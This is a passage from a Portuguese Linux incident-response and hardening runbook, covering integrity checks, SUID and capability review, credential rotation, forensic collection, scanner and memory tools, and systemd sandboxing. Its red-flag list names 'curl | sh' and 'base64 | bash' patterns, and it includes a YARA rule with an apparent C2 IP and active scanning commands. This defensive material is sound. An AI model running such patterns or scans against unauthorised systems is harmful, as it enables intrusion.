sudo ss -tnp | grep '<C2_IP>'                             # mesma conexão de C2
```

> Compare também: mesma porta/serviço exposto (o vetor), mesmo usuário criado, mesma janela de `ctime`. Um host "limpo" que compartilha o vetor ainda está em risco até você fechá-lo.

---

# 24. Verificar integridade do sistema

> **Por quê:** detectar binários de sistema adulterados (trojanização de `ls`, `ps`, `ss`, `sshd`…). **Olhe para:** checksum divergente em `/bin`, `/usr/bin`, `/sbin`, `/lib*`, `/etc`. Adulteração aqui = alto risco → considere rebuild (§27).

## RHEL/CentOS

```bash
sudo rpm -Va
```

## Debian/Ubuntu

```bash
sudo dpkg -V
```

Como ler a saída (mesmo formato nos dois, por arquivo alterado):

```text
S.5....T.  c /etc/foo.conf
│ │    │   └ tipo: c=config (mudança esperada), vazio=binário/lib (NÃO esperado)
│ │    └ T  mtime mudou
│ └ 5  checksum mudou   ← o campo que importa
└ S    tamanho mudou
outros: M modo/permissão | U dono | G grupo | L link simbólico | D device
'missing' = arquivo do pacote sumiu   |  '?' = não verificável
```

> **Regra de leitura:** `5` em arquivo **não-config** dentro de `/bin`, `/usr/bin`, `/sbin`, `/lib*` = binário do sistema adulterado (trojan de `ls`, `ps`, `ss`, `sshd`). Diferenças em `/etc/*.conf` são normais — você mesmo edita config.

> **Limite honesto:** esta verificação compara com a base de dados **local** de pacotes (RPM/dpkg). Um atacante root pode reescrever essa base junto com o binário, e nada aqui cobre arquivos que não vieram de pacote. Divergência aqui é prova forte de comprometimento; ausência de divergência **não** é prova de limpeza. Para garantia real, compare com um host-espelho ou use baseline offline (AIDE/Tripwire, §32).

Procure alterações inesperadas principalmente em:

```text
/bin
/sbin
/usr/bin
/usr/sbin
/lib*
/etc
```

---

# 25. Capabilities e SUID

> **Por quê:** achar caminhos de escalonamento persistente deixados pelo atacante. **Olhe para:** capability/SUID inesperado (ex.: `cap_setuid` num binário estranho, SUID em `/tmp`/home) — compare com um baseline conhecido.

Capabilities:

```bash
sudo getcap -r / 2>/dev/null
```

SUID:

```bash
sudo find / \
-xdev \
-type f \
-perm -4000 \
-ls \
2>/dev/null
```

Compare com baseline conhecido.

> **O que cada mecanismo dá:** SUID faz o binário rodar como o **dono do arquivo** (SUID root = root). Capability dá um **pedaço** do poder de root ao binário — mais discreto, porque não aparece num `find -perm -4000`. Ambos são caminho de escalonamento *persistente*: ficam no disco esperando, mesmo depois de você matar o processo.

```text
cap_setuid       vira qualquer usuário       → root direto
cap_dac_override ignora permissões de arquivo → lê/escreve tudo
cap_sys_ptrace   injeta em processos alheios  → rouba credencial da memória
cap_sys_module   carrega módulo de kernel     → rootkit
cap_net_raw      sniffing/spoofing
```

> Suspeite de: SUID em `/tmp`, `/home` ou `/dev/shm` (nunca legítimo), SUID em cópia de shell/interpretador (`bash`, `python`, `perl`, `find`, `cp`) — é a receita pronta de escalonamento — e capability em binário que não é do sistema. `cp` de um binário SUID **não** preserva o bit sem `-a`/root, então um SUID em home foi posto ali de propósito.

---

# 26. Rotação de credenciais

> **Por quê:** o atacante teve tempo de leitura no host; qualquer segredo alcançável saiu de lá. Limpar o malware não invalida o que ele copiou. **Olhe para:** o **raio de alcance do usuário comprometido**, não só o que você acha que ele usou.

**Presuma cópia, não uso.** O uso pode vir semanas depois, de outro IP, contra outro sistema — e aí não parece mais incidente, parece acesso normal. Por isso rotação não é opcional nem "quando der".

Se um processo de aplicação foi comprometido, considere exposto tudo que aquele usuário conseguia ler:

```text
.env
variáveis PM2
PostgreSQL
MongoDB
Redis
RabbitMQ
API keys
tokens
GCP/AWS credentials
service accounts
SSH keys
certificados
cookies/tokens internos
```

Rotacione fora do host comprometido.

> **Fora do host** e nesta ordem: primeiro **revogue** a credencial antiga (senão a nova convive com a velha ainda válida), depois emita a nova, depois distribua. Rotacionar de dentro da máquina comprometida entrega a credencial nova ao mesmo atacante.

> Não esqueça o que não é senha: **tokens de sessão/refresh e cookies continuam válidos** depois da troca de senha — invalide as sessões. E a credencial da instância na cloud (§10.5) não fica em nenhum `.env`: rotacione a service-account/role também.

---

# 27. Quando rebuild é necessário

Rebuild da máquina a partir de imagem confiável quando:

* atacante teve root;
* malware foi executado como root;
* houve alteração de binários do sistema;
* não é possível garantir integridade;
* houve rootkit/kernel module;
* não há baseline confiável;
* a máquina é crítica e o impacto justifica rebuild.

Limpar:

```text
processo
arquivo
cron
```

é contenção.

Não é garantia de que o host voltou a ser confiável.

> **O raciocínio:** limpeza exige enumerar **tudo** que o atacante fez — e você só remove o que encontrou. Rebuild inverte o problema: parte de um estado sabidamente bom e não depende da sua enumeração ter sido completa. Com root, a assimetria é definitiva: as próprias ferramentas que você usaria para verificar podem estar mentindo.

> **Rebuild não fecha o incidente.** Se o vetor de entrada (§14/§16) continuar aberto, a máquina nova é comprometida de novo — às vezes em minutos. Ordem: fechar o vetor → rebuild a partir de imagem confiável → restaurar dados **validados** (backup anterior ao incidente; §9 datou isso) → rotacionar credenciais (§26) → varrer a frota (§23).

## Antes do rebuild: a imagem é confiável?

"Rebuild a partir de imagem confiável" pressupõe que a **imagem, o registry e o pipeline** não são o vetor. Se forem, o host novo nasce comprometido e você fez tudo certo.

```bash
# de onde veio o que está rodando
sudo docker inspect --format '{{.Image}} {{.Config.Image}} {{.Created}}' <CONTAINER> 2>/dev/null
sudo docker image inspect <IMAGEM> --format '{{.Created}} {{.RepoDigests}}' 2>/dev/null
gcloud compute instances describe <VM> --format='value(disks[0].source,disks[0].licenses)' 2>/dev/null
# a RECEITA mudou na janela do incidente? (§9)
git -C <REPO_INFRA> log --since="$START" --stat -- \
  Dockerfile packer/ ansible/ .github/ .gitlab-ci.yml
```

```text
imagem base    digest fixado (sha256) ou tag móvel? 'latest' muda de conteúdo sem você saber
registry       é o seu? há push recente que ninguém reconhece?
pipeline       quem tem permissão de push no branch de deploy; o runner é self-hosted (e este host)?
deploy keys    chave de deploy / token de CI criados na janela do incidente
segredo do CI  variável do pipeline = credencial que o atacante lê se chegou lá (§26)
```

> **A pergunta que fecha:** o comprometimento é *deste host* ou *do que produz este host*? Se for do pipeline, nem a §23 nem o rebuild resolvem — cada host novo sai infectado. O sinal típico é reinfecção logo após o redeploy, com o **mesmo artefato** e sem o vetor da §16 ter sido reaberto.

---

# 28. Coleta rápida em um único bloco

> **Por quê:** evidência tem prazo de validade. **Olhe para:** coletar na **ordem de volatilidade** — o que morre primeiro, primeiro. Um reboot (ou o kill da §20) apaga para sempre o que só existia em memória.

```text
mais volátil  memória, processos, conexões, sockets, /proc   segundos
              tabela de rotas/ARP, conntrack                 minutos
              arquivos temporários, /tmp, /dev/shm           horas
              disco, logs locais                             dias (rotação!)
menos volátil snapshot, logs off-box/cloud                   meses
```

> Consequência prática: `ss`/`ps`/`lsof` **antes** de qualquer `find` demorado. E o log local pode ser mais volátil que o disco — se a rotação for de 2 dias, ele expira antes do arquivo (§10.4).

Para uma triagem inicial:

```bash
IR=/root/ir-$(date +%Y%m%d-%H%M%S)

sudo mkdir -p "$IR"
sudo chmod 700 "$IR"

date -Is | sudo tee "$IR/date.txt"

sudo ss -tunap \
  > "$IR/ss-tunap.txt"

sudo ss -tnp state established \
  > "$IR/ss-established.txt"

sudo ss -ltnp \
  > "$IR/ss-listen.txt"

sudo lsof -Pan -i \
  > "$IR/lsof-network.txt"

sudo ps auxww \
  > "$IR/ps.txt"

sudo pstree -ap \
  > "$IR/pstree.txt"

sudo lsof +L1 \
  > "$IR/deleted-open-files.txt"

sudo systemctl list-unit-files \
  > "$IR/systemd-units.txt"

sudo systemctl list-timers --all \
  > "$IR/systemd-timers.txt"

sudo iptables-save \
  > "$IR/iptables.txt" \
  2>/dev/null || true

sudo nft list ruleset \
  > "$IR/nftables.txt" \
  2>/dev/null || true
```

---

# 29. Coleta rápida de um PID

> **Por quê:** o mesmo material da §4, mas **salvo em arquivo** — para quando o processo pode morrer, ser morto (§20) ou o host reiniciar. Colete agora, leia depois. **Olhe para:** rodar isto **antes** de qualquer ação que altere o processo.

```bash
PID=<PID>

{
sudo ps -o \
pid,ppid,user,group,lstart,etime,stat,args \
-p "$PID"

sudo pstree -aps "$PID"

sudo readlink -f /proc/$PID/exe
sudo readlink -f /proc/$PID/cwd

sudo sh -c \
"tr '\0' ' ' < /proc/$PID/cmdline"
echo

sudo sh -c \
"tr '\0' '\n' < /proc/$PID/environ"

sudo grep -E \
'Name|State|Pid|PPid|Uid|Gid|TracerPid|Cap' \
/proc/$PID/status

sudo ls -la /proc/$PID/fd

sudo lsof -Pan -p "$PID"

sudo lsof -Pan -a -p "$PID" -i
} 2>&1 | sudo tee "$IR/pid-$PID.txt"
```

```bash
# e o que não é texto: o binário e a memória, enquanto o processo existe (§6)
sudo cp /proc/$PID/exe "$IR/samples/pid-$PID.bin"     # vale mesmo se o arquivo foi apagado (§3.14)
sudo gcore -o "$IR/samples/pid-$PID.core" "$PID"      # config e C2 do binário packed (§5.5)
```

> A ordem importa: `/proc/<pid>/exe` e o core **deixam de existir** no instante em que o processo morre. Se você vai matar (§20), estes dois comandos vêm antes.

---

# 30. Coleta rápida de um arquivo

```bash
FILE=<FILE>

sudo stat "$FILE"
sudo file "$FILE"
sudo sha256sum "$FILE"

sudo getfacl "$FILE"
sudo lsattr "$FILE"
sudo getcap "$FILE"

sudo strings -a -n 8 "$FILE" \
  | head -200

sudo readelf -h "$FILE"
sudo readelf -d "$FILE"

sudo objdump -p "$FILE"

sudo lsof "$FILE"
sudo fuser -v "$FILE"
```

---

# 31. Red flags para reconhecer rapidamente

> **Como usar:** nenhum item abaixo é prova sozinho — cada um tem explicação legítima possível. O valor está em ser **anomalia barata de checar**: o custo de olhar é segundos, o custo de não olhar é o incidente inteiro. Dois ou três juntos, no mesmo processo ou na mesma janela de tempo, deixam de ser coincidência.

**O princípio por trás de todos:** software legítimo é **previsível** — vem de pacote, mora onde a distro põe, roda com o usuário esperado, fala com quem sempre falou. Red flag é toda quebra dessa previsibilidade. Por isso conhecer o **normal do seu host** vale mais que qualquer lista.

## Rede

```text
processo desconhecido → IP público
```

```text
usuário de aplicação → conexão outbound inesperada
```

```text
conexão persistente em 443 sem processo esperado
```

---

## Processo

```text
nome tipo kernel mas executável em /home
```

```text
PPID 1 sem motivo conhecido
```

```text
processo em /tmp ou /dev/shm
```

```text
child bash/sh de processo desconhecido
```

```text
PTY + socket remoto
```

---

## Arquivo

```text
ELF em ~/.config
```

```text
ELF em ~/.cache
```

```text
ELF em /tmp
```

```text
mtime antigo + ctime recente
```

```text
arquivo sem pacote correspondente
```

---

## Persistência

```text
base64 | bash
```

```text
curl | sh
```

```text
exec -a
```

```text
cron com nome tentando parecer kernel
```

```text
unit systemd apontando para /home ou /tmp
```

```text
authorized_keys alterado sem mudança conhecida
```

---

# 32. Ferramentas úteis para scan/análise

Os comandos deste runbook resolvem a triagem sem instalar nada. Ferramenta entra quando você precisa de **escala** (varrer tudo/vários hosts), **profundidade** (memória, binário, disco cru) ou **segunda opinião** (baseline, host não confiável).

> ⚠️ **Num host comprometido, binário local pode estar adulterado** — rootkit esconde do scanner que roda em cima dele. Prefira **snapshot/cópia offline** (§1) ou binário estático trazido de fora. Instalar pacote no host suspeito também custa: mexe na base de pacotes (que é sua evidência na §24), gera tráfego e pode avisar o atacante.

## Como escolher

```text
achar o que eu JÁ SEI que existe (IOC)    → yara, Loki, clamav, osquery
achar o que eu NÃO SEI                    → pspy/execsnoop (ao vivo), plaso (timeline), lynis
provar que binário do sistema mudou       → debsums / rpm -Va, AIDE, hashdeep
binário sem strings / packed              → AVML + Volatility, capa, upx -d
o arquivo foi APAGADO                     → sleuthkit (fls/icat), Volatility (bash na RAM)
o mesmo comprometimento em N hosts        → osquery, ansible, Fenrir, Velociraptor
fechar o vetor                            → trivy/osv-scanner, nmap/nuclei (de fora)
a exposição está na CONTA, não no host    → prowler, ScoutSuite (§34.10)
```

## Antes de instalar nada (já está no host)

```text
ss, lsof, ps, pstree     §2, §3      estado ao vivo
ausearch/auditctl        §11         a fonte mais forte, se estiver ligada
rpm -Va / dpkg -V        §24         integridade dos pacotes
getcap, find -perm       §25         escalonamento deixado para trás
strings/readelf/objdump  §5          análise estática do binário
gcore                    §6          dump de memória de UM processo
tcpdump                  §2.6        tráfego
capsh --decode=<hex>     §3.7        traduz CapEff
busybox                  §7.8        segunda opinião contra LD_PRELOAD
```

## Monitorar ao vivo (auditd desligado, ou pegar no flagrante)

```text
pspy              # execs e cron em tempo real SEM root e sem instalar nada
bcc-tools/bpftrace# execsnoop, opensnoop, tcpconnect — via eBPF, custo baixo
sysdig / falco    # captura de syscall com filtro; falco = regras de detecção
tracee            # eBPF com regras de comportamento prontas: detecta, não só captura
Sysmon for Linux  # exec/conexão/escrita em log estruturado — o substituto do auditd desligado
```
```bash
./pspy64                                   # binário único, sem deps: vê o cron relançar o malware
sudo execsnoop-bpfcc                       # todo execve, com PPID  (RHEL: /usr/share/bcc/tools/)
sudo tcpconnect-bpfcc                      # toda conexão de saída + PID → pega o beacon periódico (§2.7)
sudo sysdig -p'%evt.time %proc.pname %proc.name %evt.args' evt.type=execve
sudo tracee --scope comm!=tracee           # eventos + detecções, sem compilar nada
sudo sysmon -accepteula -i config.xml      # depois: leia os eventos no syslog/journal
```

> Serve para dois momentos: **antes** de mexer (o C2 é periódico? o beacon aparece de 10 em 10 min?) e **depois** da limpeza (§22) — algo ainda tenta relançar? É o substituto do auditd quando ele não estava ligado.

## Rootkit / objetos escondidos

```text
rkhunter          # checa rootkits, binários alterados, portas conhecidas
chkrootkit        # idem, heurísticas clássicas
unhide            # processos/portas escondidos (compara ps/ss x /proc x syscalls)
```
```bash
sudo rkhunter --update && sudo rkhunter --check --sk    # --sk = não pedir ENTER a cada bloco
sudo chkrootkit -q                                      # -q = só o que é anômalo
sudo unhide quick                                       # PID visível em /proc mas não no ps
sudo unhide-tcp                                         # porta em LISTEN que o ss não mostra
```

> ⚠️ **Nunca rode `rkhunter --propupd` num host suspeito**: ele grava o estado **atual** como baseline — ou seja, carimba o trojan como legítimo e você perde a comparação para sempre.

> Falso positivo aqui é regra, não exceção (esses scanners são heurísticos e desatualizam). Trate o resultado como **pista para investigar** com §3/§5, nunca como veredito. Já o `unhide` é diferente: divergência entre duas visões do mesmo kernel é sinal técnico forte.

## Malware / assinatura / IOC

```text
clamav (clamscan) # antivírus; scan recursivo de paths suspeitos
maldet (LMD)      # Linux Malware Detect; forte em webshell/backdoor de docroot
yara              # regras de IOC (família, C2, strings) — o formato padrão da indústria
Loki / THOR-Lite  # scanner pronto: YARA + hash + nome de arquivo + regras — bom 1º pass
Fenrir            # mesma ideia em bash puro, sem dependência — host minimalista/container
```
```bash
sudo freshclam && sudo clamscan -r -i /home /tmp /var/tmp /dev/shm /data   # -i = só infectados
sudo maldet -a /var/www                       # scan sob demanda do docroot (§16)
sudo yara -r -w regras.yar /home /tmp         # rulesets: Yara-Rules, Neo23x0/signature-base
python3 loki.py -p / --noprocscan             # ajuste o escopo; roda pesado em / inteiro
sudo ./fenrir.sh /var/www
```

> **Assinatura só acha o conhecido: resultado negativo não inocenta o host.** O valor está em varrer volume rápido (docroot, `/home`, `/tmp`) e em rodar **suas** regras YARA com os IOCs deste incidente — foi para isso que você tirou hash e strings na §5.

Regra YARA mínima com o que você já tem (serve para a frota, §23):

```text
rule ioc_incidente {
  strings: $c2 = "51.91.190.241"  $n = "defunct"
  condition: any of them or hash.sha256(0, filesize) == "<SHA256>"
}
```

## Coleta padronizada (quando o caso vai escalar)

```text
UAC           # Unix-like Artifacts Collector — coleta completa e reproduzível em 1 pacote
CyLR          # coletor rápido de artefatos
Velociraptor  # coleta E caça, num host ou na frota, com linguagem de consulta própria (VQL)
```
```bash
sudo ./uac -p ir_triage /evidence     # perfis: ir_triage, full; saída .tar.gz + hash
sudo ./velociraptor artifacts collect Linux.Sys.Pslist --format json   # standalone, sem servidor
```

> Use quando terceiro/jurídico/seguro vai olhar depois: saída padronizada e documentada vale mais que a sua coleta ad-hoc da §28 — e evita a acusação de "manipulou a evidência".

> **Velociraptor cobre sozinho o que UAC + osquery + ansible fazem separados**: roda como binário único standalone num host, ou como servidor com agentes para perguntar a mesma coisa à frota inteira (§23). Se o caso vai passar de um host, comece por ele em vez de montar a colagem.

## Análise do binário (sem executar — §5.9)

```text
binwalk        # payload/arquivo embutido dentro do binário
upx            # detecta e desempacota o packer mais comum
capa           # traduz o binário em CAPACIDADES ("abre socket", "persiste via cron")
radare2/rizin  # análise/desmontagem interativa
ghidra         # descompilador, quando precisa entender o protocolo de C2
vt (VirusTotal CLI)
```
```bash
binwalk -e "$FILE"                          # extrai o que estiver embutido
upx -t "$FILE" && upx -d -o unpacked "$FILE"   # se for UPX, resolve o "sem strings" da §5.5
capa "$FILE"                                # melhor custo/benefício: entende sem ler assembly
r2 -A "$FILE"                               # dentro: 'iz' strings, 'afl' funções, 'ii' imports
vt file <SHA256>                            # consulta por HASH — não suba o arquivo (§5.4)
```

## Integridade / baseline

```text
debsums           # (Debian) checksum dos pacotes — complementa dpkg -V
AIDE / Tripwire   # baseline de integridade (compara pré x pós)
hashdeep          # hash recursivo + modo de auditoria contra lista conhecida
osquery           # o host como SQL (também serve para frota, abaixo)
Wazuh / OSSEC     # HIDS: FIM, rootkit, correlação de log — o que evita o próximo incidente
lynis / openscap  # auditoria de hardening e compliance/CVE
```
```bash
sudo debsums -c                                     # lista só os arquivos alterados
sudo aide --check                                   # exige DB criada ANTES e guardada FORA do host
hashdeep -r -c sha256 /usr/bin /bin /sbin > now.txt
hashdeep -r -a -k baseline.txt /usr/bin             # -a audita contra a baseline; sai != 0 se divergir
sudo lynis audit system                             # o que deixou o vetor possível, em ordem de risco
```

> Baseline só existe se foi feita **antes** e mora **fora** do host — senão o atacante a atualiza junto. Sem baseline, o substituto prático é comparar hashes com uma **máquina-espelho** da mesma imagem e versão de pacote.

## Memória (binário packed, C2 em RAM)

```text
AVML              # aquisição em Linux cloud (Microsoft) — binário estático, sem compilar módulo
LiME              # aquisição via módulo de kernel (precisa dos headers da versão exata)
Volatility 3      # análise do dump: processos, conexões, injeção, history
```
```bash
sudo ./avml /evidence/mem.lime                       # capturar ANTES de matar (§6/§20)
vol -f mem.lime linux.pslist.PsList                  # processos como o KERNEL os vê
vol -f mem.lime linux.lsof.Lsof                      # fds/sockets do dump
vol -f mem.lime linux.malfind.Malfind                # região RWX anônima = código injetado
vol -f mem.lime linux.bash.Bash                      # history recuperado da RAM
vol -f mem.lime linux.check_syscall.Check_syscall    # syscall table hookada = rootkit de kernel
```

> **Gotcha do Volatility em Linux:** ele precisa do **símbolo (ISF) do kernel exato** daquele host — sem isso, nenhum plugin roda. Gere com `dwarf2json` a partir do `vmlinux`/debug symbols da mesma versão, e faça isso **enquanto a máquina existe**.

> Dois motivos para não pular a memória: o `linux.bash.Bash` recupera comandos mesmo com `~/.bash_history` apagado ou apontando para `/dev/null` (§13), e o binário packed só está descompactado **ali** (§5.5).

## Disco: arquivo apagado, timeline completa

```text
sleuthkit (fls, icat, mactime)  # lê o filesystem CRU: enxerga o que foi deletado
debugfs                         # ext4: espia inode apagado sem montar o arsenal acima
extundelete / photorec          # recuperação de conteúdo apagado
plaso / log2timeline            # super-timeline: filesystem + logs + artefatos, tudo ordenado
mac_robber + mactime            # timeline clássica, leve
```
```bash
sudo dd if=/dev/sdX of=/evidence/disk.img bs=4M status=progress   # ou use o snapshot da §1
fls -r -d disk.img                          # -d = só ENTRADAS DELETADAS, com inode
icat disk.img <INODE> > recuperado.bin      # recupera o conteúdo pelo inode
sudo debugfs -R 'lsdel' /dev/sdX            # inodes apagados e QUANDO — checagem de 5 segundos
sudo debugfs -R 'dump <INODE> /tmp/rec.bin' /dev/sdX
mac_robber /mnt/evidence | mactime -d -b - > timeline.csv
log2timeline.py --storage_file plaso.db disk.img && psort.py -o dynamic plaso.db
```

> **Limite do `debugfs` em ext4:** o `lsdel` lista os inodes e a hora da remoção, mas o ext4 costuma **zerar a árvore de extents** no delete — então o `dump` falha com frequência. Use-o como resposta rápida a "algo foi apagado, e quando?"; para recuperar o conteúdo de fato, sleuthkit/extundelete **sobre a imagem**, nunca no disco montado em escrita.

> **Por que isso vai além da §9:** `find -newerct` só enxerga arquivo que **existe**. O dropper que o atacante usou e apagou não aparece lá — mas o inode ainda está no filesystem, e `fls`/`icat` o trazem de volta. Rode sempre sobre a **imagem/snapshot**, nunca no disco montado em escrita.

## Componentes vulneráveis (fechar o vetor — §16)

```text
trivy         # CVE em filesystem, código, imagem de container e IaC
grype         # CVE a partir de SBOM/imagem
osv-scanner   # CVE via base OSV, direto dos manifests (Google)
npm audit / pip-audit / bundler-audit / govulncheck   # nativo de cada stack
```
```bash
trivy fs --scanners vuln /srv/app        # casa com os manifests achados na §16
trivy image <IMAGEM>                     # o container já subiu vulnerável?
osv-scanner -r /srv/app
```

> Isto responde a pergunta que fecha o incidente: **por onde entrou**. Cruze a data do CVE e a versão instalada com a janela da §9 — se bate, você tem a hipótese do vetor, não só o efeito.

## Frota: a mesma pergunta em N hosts (§23)

```text
osquery       # transforma o host em SQL; osqueryi local ou fleet centralizado
ansible/pssh  # rodar o mesmo comando/IOC em todos os hosts
Fenrir/Loki   # scanner de IOC portátil para distribuir
```
```bash
osqueryi "SELECT pid,name,path,uid FROM processes WHERE path LIKE '/tmp/%' OR path LIKE '/dev/shm/%';"
osqueryi "SELECT DISTINCT p.name,p.path,l.port,l.address FROM listening_ports l JOIN processes p USING(pid);"
osqueryi "SELECT * FROM users WHERE uid=0;"
osqueryi "SELECT path,sha256 FROM hash WHERE path='/usr/bin/ss';"
ansible all -m shell -a "ss -tnp | grep -F '<C2_IP>'; sha256sum <ARQ> 2>/dev/null"
```

> osquery é a forma prática de fazer a §23 sem escrever script por host: mesma pergunta, resposta tabelada, comparável entre máquinas. É também a melhor forma de **levantar baseline** antes do próximo incidente.

## Rede: identificar/atribuir o C2 (passivo)

```text
dig, whois, ipinfo   # dono do bloco, ASN, país, PTR — sem tocar no atacante
ngrep, tshark        # inspeção de pacote a partir do pcap (§2.6)
zeek                 # transforma pcap em logs de SESSÃO (conn/ssl/dns/http)
```
```bash
dig -x <IP> +short ; whois <IP> | grep -iE 'netname|orgname|country|abuse'
curl -s https://ipinfo.io/<IP>
tshark -r suspect.pcap -Y 'tls.handshake.type==1' \
  -T fields -e ip.dst -e tls.handshake.extensions_server_name   # SNI = domínio do C2
zeek -r suspect.pcap && cat conn.log ssl.log dns.log
```

> ⚠️ **Consulta passiva (DNS/whois/ipinfo) é segura; conectar de volta ao C2 não.** `curl`, `nmap` ou browser contra o IP do atacante confirma para ele que foi detectado — e ele reage apagando rastro e trocando de infraestrutura. Nunca "vá ver o que tem lá".

## Validar SUA superfície (externo, só com autorização)

Confirmar o que está exposto e reproduzir o vetor — rode de fora, contra o próprio ativo:

```text
nmap / naabu      # portas e serviços expostos (ex.: um backend que devia ser interno)
testssl.sh        # TLS/config do endpoint
nuclei            # scan de vulnerabilidades por templates (CVE, exposições)
ffuf / gobuster   # enumeração de rotas/parametros de uma app web
nikto             # checks web genéricos
```
```bash
nmap -Pn -p- --min-rate 1000 <IP>         # a porta interna responde de fora? (o bypass da §15)
nmap -sV -p <PORTA> <IP>                  # versão do serviço → casa com CVE conhecida
testssl.sh https://<host>
nuclei -u https://<host>                  # templates de exposição/CVE
ffuf -u https://<host>/FUZZ -w wordlist.txt -mc 200,301,403   # rota esquecida/painel exposto
```

> O achado que mais importa aqui é simples: **um serviço que devia ser interno respondendo do lado de fora**. Compare o resultado do `nmap` externo com o `ss -ltnp` local (§14) — o que aparece nos dois é sua superfície real.

> Scan ativo é intrusivo e pode gerar tráfego/alertas — faça só em ambiente/ativo autorizado e, de preferência, avisando o time.

## Postura da cloud (a superfície da §34.10)

```text
prowler                # centenas de checks em AWS/GCP/Azure: IAM, exposição, log, criptografia
ScoutSuite             # inventário + achados por serviço, multi-cloud, saída navegável
steampipe/cloudquery   # a conta inteira como SQL — bom para pergunta específica e pontual
```
```bash
prowler aws                                  # ou: prowler gcp --project-id <PROJ>
python scout.py gcp --project-id <PROJ>
```

> Responde em minutos as cinco perguntas da §34.10: há IP público onde não devia, role ampla numa credencial de instância, bucket exposto, snapshot/imagem compartilhada fora da conta e chave estática antiga. É a auditoria da §34.8 um andar acima — e é o único andar onde o comprometimento **não deixa rastro nenhum no host**, então nenhuma outra ferramenta desta seção o encontra.

---

# 33. Regra principal

Não comece procurando uma CVE.

Comece pelo que está acontecendo agora:

```text
IP
↓
PID
↓
PPID
↓
executável real
↓
usuário
↓
arquivos abertos
↓
arquivo/binário
↓
persistência
↓
timeline
↓
aplicação responsável
↓
vetor de entrada
```

Cada passo responde uma pergunta, e a resposta é a entrada do próximo:

```text
o que fala com fora?      → conexão
quem abriu isso?          → PID
quem executou esse?       → PPID / árvore
o que ele É de verdade?   → /proc/<pid>/exe
com que poder roda?       → usuário, capabilities
quando apareceu?          → ctime → janela → todas as fontes (§9.1)
por onde ele entrou?      → serviço na porta + sink na app (§14/§16)
```

> **CVE é conclusão, não ponto de partida.** Procurar CVE primeiro é adivinhar; a máquina já está te contando o que aconteceu — leia o estado atual e deixe a hipótese aparecer no fim. Enquanto o **vetor** não estiver fechado, limpar é adiar: o host volta a ser comprometido pelo mesmo caminho.

> E encerre respondendo quatro coisas por escrito: **como entrou**, **o que fez** (e alcançou), **o que saiu**, **como impedir que volte**. Sem as quatro, o incidente não está fechado — só está quieto.

A terceira resposta é a §37. A quarta é a §34. Quem decide, quem avisa e o que fica escrito é a §39.

---

# 34. Reduzir o blast radius (blindagem da VM)

> **Por quê:** as §1–§33 assumem que já deu errado. Esta assume que **vai** dar errado de novo — e trata do que muda quando dá. **Olhe para:** cada controle abaixo transformando um comprometimento *total* num comprometimento *contido*.

**A troca de pergunta:** de "como impedir a invasão?" (impossível garantir) para "**quando um processo da app for controlado pelo atacante, o que exatamente ele alcança?**". Esse alcance tem quatro dimensões — e cada uma se corta separadamente:

```text
identidade  o que o processo PODE fazer         → usuário, capabilities, sandbox
rede        com quem ele PODE falar             → egress, segmentação
dados       o que ele PODE ler                  → secrets, escopo da credencial
tempo       por quanto tempo ele fica           → host descartável, rotação, detecção
```

> **Toda a §7 (persistência) precisa de duas coisas: escrever em algum lugar e ser executada por algo.** Quase tudo aqui existe para tirar uma dessas duas.

---

## 34.1. Sandbox do serviço (systemd)

O maior ganho por linha editada — e não precisa mudar o código da app. Aplique na unit do serviço exposto:

```ini
[Service]
User=app                       # nunca root (o óbvio que quase sempre falta)
NoNewPrivileges=yes            # mata SUID e capabilities: §25 deixa de ser rota
ProtectSystem=strict           # todo o filesystem read-only...
ReadWritePaths=/var/lib/app    # ...exceto o que a app realmente escreve
ProtectHome=yes                # /home invisível → mata o drop em ~/.config e ~/.cache (§8)
PrivateTmp=yes                 # /tmp e /dev/shm privados → mata o drop em /tmp (§8)
CapabilityBoundingSet=         # vazio = nenhuma capability, nunca (§3.7)
RestrictSUIDSGID=yes
MemoryDenyWriteExecute=yes     # sem página W+X → quebra packer e injeção (§5.5, §3.10)
LockPersonality=yes
RestrictAddressFamilies=AF_INET AF_INET6 AF_UNIX    # sem AF_NETLINK/AF_PACKET
SystemCallFilter=@system-service
SystemCallFilter=~@module @mount @debug @swap       # sem carregar módulo, montar, ptrace
ProtectKernelModules=yes
ProtectKernelTunables=yes
ProtectProc=invisible          # a app não enxerga /proc dos outros processos (§3)
IPAddressDeny=any              # egress default-deny no cgroup do serviço
IPAddressAllow=10.0.0.0/8      # ...só o que precisa
```

Meça antes e depois — o systemd dá nota:

```bash
systemd-analyze security <SERVICE>          # 0 (ótimo) a 10 (exposto), item a item
sudo systemctl edit <SERVICE>               # aplica como override, sem tocar na unit do pacote
sudo systemctl daemon-reload && sudo systemctl restart <SERVICE>
```

> **Aplique incrementalmente.** `ProtectSystem=strict` e `SystemCallFilter` quebram app que escreve fora do esperado — suba um por vez, teste, e leia o `journalctl -u <SERVICE>` para ver o que foi negado. Vale o trabalho: com isso, o mesmo RCE que hoje deixa um binário em `~/.config` e abre C2 passa a não ter onde escrever nem para onde falar.

---

## 34.2. Filesystem sem execução

Onde o atacante escreve não deve executar; onde executa não deve ser gravável.

```bash
# /etc/fstab
/tmp        tmpfs  defaults,noexec,nosuid,nodev,size=1G  0 0
/var/tmp    ext4   defaults,noexec,nosuid,nodev          0 0
/dev/shm    tmpfs  defaults,noexec,nosuid,nodev          0 0
/home       ext4   defaults,nosuid,nodev                 0 0
```

```bash
findmnt -o TARGET,OPTIONS /tmp /var/tmp /dev/shm /home    # confere o que está valendo AGORA
```

> **Limite honesto:** `noexec` não é barreira absoluta — um interpretador contorna (`sh < script`, `python arquivo`) e o próprio loader também (`/lib64/ld-linux-x86-64.so.2 ./binario`). O que ele faz é **encarecer e barulhar**: quebra dropper preguiçoso, força o atacante a técnicas mais visíveis, e combina com `MemoryDenyWriteExecute` (34.1) para fechar a alternativa em memória.

---

## 34.3. Egress default-deny

**O controle de maior alavancagem do arquivo inteiro.** Quase todo backdoor precisa sair (§17); quase nenhum servidor precisa falar com a internet inteira.

```bash
# saída do usuário da app: só o aprovado
sudo iptables -A OUTPUT -m owner --uid-owner app -d <API_APROVADA> -j ACCEPT
sudo iptables -A OUTPUT -m owner --uid-owner app -d 169.254.169.254 -j REJECT   # metadata (§10.5)
sudo iptables -A OUTPUT -m owner --uid-owner app -j REJECT
```

* No firewall da **cloud** também (regra de egress na VPC) — o do host cai junto com o host.
* Bloqueie o **metadata** para todo processo que não precisa dele: é o pivô da §10.5. Na AWS, exija **IMDSv2** e reduza o hop limit; no GKE, ative *metadata concealment*/Workload Identity.
